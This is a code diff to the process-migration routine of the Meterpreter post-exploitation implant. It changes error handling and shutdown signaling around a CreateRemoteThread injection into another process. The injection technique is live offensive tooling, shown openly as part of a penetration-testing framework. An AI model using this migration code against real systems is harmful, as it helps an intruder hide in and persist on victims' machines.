@@ -1,6 +1,6 @@
 #include "common.h"
 
-
+extern THREAD serverThread;
 /*
  * core_migrate
  * ------------
@@ -223,21 +223,20 @@ DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
 		if (!(thread = CreateRemoteThread(process, NULL, 1024*1024, (LPTHREAD_START_ROUTINE)codeBase, dataBase, 0, &threadId)))
 		{
 			result = GetLastError();
-			ExitThread(result);
+			break;
 		}
 
-		// Wait at most 5 seconds for the event to be set letting us know that
-		// it's finished
-		if (WaitForSingleObjectEx(event, 5000, FALSE) != WAIT_OBJECT_0)
+		// Wait at most 5 seconds for the event to be set letting us know that it's finished
+		if (WaitForSingleObjectEx(event, 5000, FALSE) != WAIT_OBJECT_0 )
 		{
 			result = GetLastError();
-			ExitThread(result);
+			break;
 		}
 		
+		// Signal the main server thread to begin the shutdown as migration has been successfull.
+		dprintf("[SYSTEM] Shutting down the Meterpreter thread 1 (signaling main thread)...");
 
-		// Exit the current process now that we've migrated to another one
-		dprintf("Shutting down the Meterpreter thread...");
-		ExitThread(0);
+		thread_sigterm( &serverThread );
 
 	} while (0);
 
@@ -253,7 +252,7 @@ DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
 	if (event)
 		CloseHandle(event);
 
-	return ERROR_SUCCESS;
+	return result;
 }
 
 
